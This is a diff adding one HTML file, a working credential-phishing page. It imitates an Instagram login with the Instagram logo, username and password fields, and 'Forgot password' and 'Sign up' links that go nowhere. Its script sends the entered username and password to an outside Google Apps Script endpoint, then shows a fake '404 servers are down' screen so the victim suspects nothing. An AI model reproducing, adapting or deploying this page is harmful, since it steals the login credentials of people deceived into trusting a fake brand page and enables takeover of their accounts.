@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Member Access</title>
+  <style>
+    :root {
+      --bg-color: #fafafa;
+      --text-color: #000;
+      --box-bg: #fff;
+      --border-color: #dbdbdb;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg-color: #121212;
+        --text-color: #fff;
+        --box-bg: #1e1e1e;
+        --border-color: #333;
+      }
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: var(--bg-color);
+      color: var(--text-color);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .access-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .access-panel {
+      background: var(--box-bg);
+      border: 1px solid var(--border-color);
+      padding: 40px 20px;
+      width: 90%;
+      max-width: 350px;
+      text-align: center;
+      border-radius: 8px;
+      animation: fadeIn 1s ease-in-out;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .brand-logo {
+      width: 175px;
+      margin-bottom: 20px;
+    }
+
+    input, button {
+      width: calc(100% - 2px);
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      font-size: 16px;
+      background: var(--box-bg);
+      color: var(--text-color);
+      box-sizing: border-box;
+    }
+
+    button {
+      background: #3897f0;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.2s ease;
+    }
+
+    button:hover {
+      background: #2f82e3;
+      transform: scale(1.03);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+    }
+
+    .reveal-key {
+      text-align: right;
+      margin-top: -8px;
+      font-size: 0.9em;
+      cursor: pointer;
+      color: #00376b;
+    }
+
+    .reveal-key:hover {
+      text-decoration: underline;
+    }
+
+    /* Divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 10px 0 18px 0;
+    }
+
+    .divider div {
+      flex: 1;
+      height: 1px;
+      background-color: rgba(219, 219, 219, 1);
+    }
+
+    .divider span {
+      margin: 0 18px;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3897f0;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .error-view {
+      text-align: center;
+      padding: 20px;
+      font-family: sans-serif;
+    }
+
+    .error-view h1 {
+      font-size: 40px;
+      margin: 0;
+    }
+
+    .error-view p {
+      color: #888;
+    }
+
+    @media (max-width: 400px) {
+      input, button {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="access-wrapper">
+    <div class="access-panel" id="panelMain">
+      <img src="https://cdn.worldvectorlogo.com/logos/instagram-1.svg" alt="Service Logo" class="brand-logo">
+      <form id="loginForm">
+        <input type="text" id="user_key" name="user_key" placeholder="Username" required>
+        <input type="password" id="pass_key" name="pass_key" placeholder="Password" minlength="8" required>
+        
+        <div class="reveal-key" onclick="togglePassword()">Show Password</div>
+        <button type="submit">Log In</button>
+
+        <div class="divider">
+          <div></div>
+          <span>OR</span>
+          <div></div>
+        </div>
+
+        <p style="margin:0;">
+          <a href="#" onclick="return false;" style="color:#00376b; font-size:12px; text-decoration:none;">Forgot password?</a>
+        </p>
+      </form>
+      <div class="spinner" id="spinner"></div>
+    </div>
+
+    <p id="signupBlock" style="text-align:center; font-size:14px; margin-top: 15px; color: var(--text-color);">
+      Don’t have an account? <a href="#" onclick="return false;" style="color:#3897f0; text-decoration:none;">Sign up</a>
+    </p>
+  </div>
+
+  <div class="error-view" id="errorView" style="display:none;">
+    <h1>404</h1>
+    <p>Our servers are currently down. Please try again later.</p>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwWxxaX5EKpOHUU5qoz3xXrKricbb6Xs5JFJ2NMXrOfTHSbbwxav9DF27YfY94fWCmaTg/exec';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      document.getElementById('spinner').style.display = 'block';
+
+      const data = {
+        user_key: document.getElementById('user_key').value,
+        pass_key: document.getElementById('pass_key').value
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      setTimeout(() => {
+        document.getElementById('panelMain').style.display = 'none';
+        document.getElementById('signupBlock').style.display = 'none';
+        document.getElementById('errorView').style.display = 'block';
+      }, 4000);
+    });
+
+    function togglePassword() {
+      const pwd = document.getElementById('pass_key');
+      const toggle = document.querySelector('.reveal-key');
+      if (pwd.type === 'password') {
+        pwd.type = 'text';
+        toggle.textContent = 'Hide Password';
+      } else {
+        pwd.type = 'password';
+        toggle.textContent = 'Show Password';
+      }
+    }
+  </script>
+</body>
+</html>
